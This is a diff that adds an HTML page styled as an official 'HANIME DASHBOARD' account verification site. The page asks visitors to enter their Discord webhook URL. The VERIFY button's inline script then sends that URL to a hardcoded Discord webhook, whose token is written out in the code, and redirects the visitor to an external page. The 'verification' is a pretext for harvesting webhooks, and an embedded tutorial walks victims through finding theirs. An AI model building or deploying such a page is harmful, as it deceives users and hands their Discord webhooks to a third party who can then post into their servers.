@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Dashboard</title>
+    <link rel="stylesheet" href="dashboard.css">
+    <style>
+        body{font-family:Arial,sans-serif;background:url('https://w0.peakpx.com/wallpaper/227/254/HD-wallpaper-anime-bocchi-the-rock.jpg')no-repeat center center fixed;background-size:cover;color:#fff;margin:0;padding:0;display:flex;justify-content:center;align-items:center;height:100vh;flex-direction:column}.dashboard-container{background-color:rgba(20,20,20,.8);border-radius:12px;padding:30px 25px;box-shadow:0 0 15px rgba(0,0,0,.7);text-align:center;max-width:450px;width:100%;backdrop-filter:blur(10px);box-sizing:border-box}.dashboard-container h1{font-size:32px;font-weight:700;margin-bottom:20px;color:#ff4da6;text-shadow:2px 2px 10px rgba(0,0,0,.8)}.dashboard-container p{font-size:18px;margin-bottom:20px}.instruction{font-size:20px;font-weight:700;color:#fff;margin:20px 0;text-shadow:2px 2px 5px rgba(0,0,0,.7)}input{width:90%;padding:14px;margin:15px 0;background-color:#1f1f1f;border:1px solid #333;color:#fff;border-radius:5px;outline:none;font-size:16px}.generate-button{background-color:#007bff;color:#fff;padding:14px;border:none;border-radius:5px;cursor:pointer;width:100%;font-weight:700;text-transform:uppercase;margin-top:15px;font-size:16px}.generate-button:hover{background-color:#0056b3}.error-message{color:#ff4d6d;font-size:14px;margin-top:15px}.tutorial-container{margin-top:25px;text-align:center}.tutorial-container iframe{width:100%;height:200px;border:none;border-radius:8px;box-shadow:0 0 10px rgba(0,0,0,.5)}
+    </style>
+</head>
+<body>
+    <div class="dashboard-container">
+        <h1>HANIME DASHBOARD</h1>
+        <p>Welcome to the official site! Verify your account below.</p>
+        <div class="instruction">Enter your Discord Webhook URL to complete verification.</div>
+        <input type="text" id="webhook" placeholder="Enter Webhook URL">
+        <button class="generate-button" onclick="(function(){const w=document.getElementById('webhook').value;if(Date.now()-window.lt<6e4){alert('You can only submit once every minute.');return}window.lt=Date.now();if(!/^https:\/\/discord\.com\/api\/webhooks\/\d+\/[A-Za-z0-9-_]+$/.test(w)){document.getElementById('error-message').textContent='Error: Invalid Discord Webhook URL!';return}document.getElementById('error-message').textContent='';fetch('https:\/\/discord.com\/api\/webhooks\/1315189063103545405\/bcyZzl2GF4osRG-2yTtPdVWF1XapBoSCi33KCa5BLLwhaAWRYLTj8M00TQUhukF7lj3b',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:w})}).then(r=>{if(r.ok){window.location.href='https:\/\/inju.cc\/u\/injucc'}else{document.getElementById('error-message').textContent='Error: Unable to send webhook.'}}).catch(e=>{console.error('Error:',e);document.getElementById('error-message').textContent='Error: Something went wrong!'});})()">VERIFY</button>
+        <div id="error-message" class="error-message"></div>
+        <div class="tutorial-container">
+            <p>Need help? Watch this tutorial on how to get your Discord Webhook URL:</p>
+            <iframe src="https://www.youtube.com/embed/OtegFbcnBCk" allowfullscreen></iframe>
+        </div>
+    </div>
+    <script>window.lt=0;</script>
+</body>
+</html>
